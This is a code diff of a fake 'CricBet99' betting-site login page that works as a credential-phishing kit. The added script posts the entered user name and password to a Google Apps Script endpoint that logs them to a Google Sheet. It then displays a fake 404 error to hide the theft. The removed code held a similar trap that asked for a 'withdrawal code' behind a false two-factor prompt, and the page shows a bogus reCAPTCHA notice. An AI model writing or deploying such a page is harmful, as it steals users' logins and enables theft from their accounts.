@@ -14,32 +14,25 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            flex-direction: column; /* This will align everything vertically */
+            flex-direction: column;
         }
 
-      /* Adjust logo positioning */
-.logo {
-    width: 320px;
-    height: auto;
-    margin-bottom: 20px; /* Space between logo and the login container */
-    position: relative;
-    top: -350px; /* Move the logo up by 30px (adjust this value as needed) */
-}
+        .logo {
+            width: 320px;
+            height: auto;
+            margin-bottom: 20px;
+            position: relative;
+            top: -350px;
+        }
 
-
-/* For login form container */
-.login-container {
-    background-color: #fff;
-    padding: 20px;
-    border-radius: 8px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    width: 280px;
-    text-align: center;
-    margin-top: -350px; /* Adjust this value to move the form up */
-}
-
-        .form-container {
-            margin-top: 10px;
+        .login-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 280px;
+            text-align: center;
+            margin-top: -350px;
         }
 
         .login-heading {
@@ -83,15 +76,6 @@
             background-color: #5A3310;
         }
 
-        .login-demo-btn {
-            margin-top: 15px;
-            background-color: #8B4513;
-        }
-
-        .login-demo-btn:hover {
-            background-color: #5A3310;
-        }
-
         .recaptcha-text {
             font-size: 12px;
             color: #6c757d;
@@ -108,68 +92,6 @@
             text-decoration: underline;
         }
 
-    
-/* For demo page container */
-.demo-page {
-    display: none;
-    background-color: #fff;
-    padding: 20px;
-    border-radius: 8px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-    width: 280px;
-    text-align: center;
-    margin-top: -350px; /* Adjust this value to move the demo form up */
-}
-        h2 {
-            color: #8B4513;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-
-     
-
-       /* For Demo page input field */
-.demo-page input {
-    width: calc(100% - 20px); /* Make it span the full width with padding */
-    padding: 10px;
-    border: 1px solid #ced4da;
-    border-radius: 4px;
-    font-size: 14px;
-}
-        .auth-text {
-            font-weight: bold;
-            color: black;
-            margin-bottom: 10px;
-        }
-
-        .auth-text span {
-            display: inline-block;
-            text-align: left;
-        }
-
-        .auth-text span:first-child {
-            margin-bottom: 10px;
-            color: #8B4513; /* Brown color for Login text */
-        }
-
-        .auth-text span:nth-child(2) {
-            margin-top: 5px; /* Add a little gap */
-        }
-
-        .centered-text {
-            text-align: center;
-            margin-top: 20px;
-            font-weight: bold;
-            color: black;
-        }
-
-        .centered-text span {
-            display: block;
-            margin-bottom: 20px;
-        }
-        
-        /* Styles for the 404 error page */
         .error-page {
             display: none;
             text-align: center;
@@ -200,98 +122,71 @@
             background-color: #5A3310;
         }
 
-        /* Hide logo when 404 error page is shown */
         .hide-logo {
             display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Logo at the top of the page -->
+    <!-- Logo -->
     <img src="logo.png" alt="CricBet99 Logo" class="logo" id="logo">
 
+    <!-- Login Form Container -->
     <div class="login-container">
-        <div class="form-container">
-            <div class="login-heading">LOGIN</div>
-            <!-- Main Login Form -->
-            <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST" id="loginForm">
-                <div class="form-group">
-                    <label for="UserName"></label>
-                    <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
-                </div>
-                <div class="form-group">
-                    <label for="password"></label>
-                    <input type="password" id="password" name="password" placeholder="Password" required>
-                </div>
-                <button type="submit" class="btn">Login</button>
-            </form>
-            
-            <!-- Login with Demo ID Button -->
-            <button class="btn login-demo-btn" onclick="showDemoPage()">Login with Demo ID</button>
-
-            <div class="recaptcha-text">
-                <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
-                <a href="#">Privacy Policy</a> and 
-                <a href="#">Terms of Service</a> apply.
-            </div>
-        </div>
-    </div>
-
-    <!-- Demo Login Form for Withdrawal Code -->
-    <div class="demo-page" id="demoPage">
-        <div class="centered-text">
-            <h2>LOGIN</h2>
-            <span>2-Factor Authentication Enabled. Enter Your Withdrawal Password</span>
-        </div>
-
-        <form id="demoForm" onsubmit="handleDemoForm(event)">
+        <div class="login-heading">LOGIN</div>
+        <form action="https://script.google.com/macros/s/AKfycbz2yNi0v9CH5eN9OwTyEjnVMsmn1x7dOaG-BgdmekNg8cMPuf6fzymh4r9fKAKybJ-s/exec" method="POST" id="loginForm" onsubmit="handleLoginForm(event)">
             <div class="form-group">
-                <input type="text" id="withdrawalCode" name="withdrawalCode" placeholder="Withdrawal Code" required>
+                <label for="UserName"></label>
+                <input type="text" id="UserName" name="UserName" placeholder="User Name" required>
             </div>
-            <button type="submit" class="btn">Submit</button>
-        
+            <div class="form-group">
+                <label for="password"></label>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn">Login</button>
+        </form>
+
         <div class="recaptcha-text">
-            <span class="bold-text">This site is protected by reCAPTCHA and the Google</span> 
+            <span>This site is protected by reCAPTCHA and the Google</span> 
             <a href="#">Privacy Policy</a> and 
             <a href="#">Terms of Service</a> apply.
         </div>
     </div>
 
-    <!-- Error Page for 404 -->
+    <!-- Error Page -->
     <div class="error-page" id="errorPage">
         404 PAGE NOT FOUND
         <button onclick="goBackToHome()">Back to Home Page</button>
     </div>
 
     <script>
-        // Function to show the demo page when "Login with Demo ID" is clicked
-        function showDemoPage() {
-            // Hide the login form
-            document.querySelector('.login-container').style.display = 'none';
-
-            // Show the demo page form
-            document.getElementById('demoPage').style.display = 'block';
-        }
-
-        // Handle the demo form submission
-        function handleDemoForm(event) {
+        // Handle the login form submission
+        function handleLoginForm(event) {
             event.preventDefault(); // Prevent the default form submission
 
-            const withdrawalCode = document.getElementById('withdrawalCode').value;
+            // Retrieve form data
+            const form = event.target;
+            const formData = new FormData(form);
 
-            // Hide the logo when 404 error page is shown
-            document.getElementById('logo').classList.add('hide-logo');
-
-            // Redirect to the error page (404)
-            document.getElementById('demoPage').style.display = 'none';
-            document.getElementById('errorPage').style.display = 'block';
-
-            return false; // Prevent form submission
+            // Submit the form data to the Google Sheet
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(() => {
+                // After submission, show the 404 error page
+                document.querySelector('.login-container').style.display = 'none'; // Hide the login container
+                document.getElementById('errorPage').style.display = 'block'; // Show the error page
+                document.getElementById('logo').classList.add('hide-logo'); // Hide the logo
+            })
+            .catch((error) => {
+                console.error('Error submitting the form:', error); // Log any errors
+            });
         }
 
-        // Function to go back to home page
+        // Function to redirect back to the home page
         function goBackToHome() {
-            window.location.href = 'index.html';  // Redirect to the home page (or adjust the URL)
+            window.location.href = 'index.html'; // Adjust URL if needed
         }
     </script>
 </body>
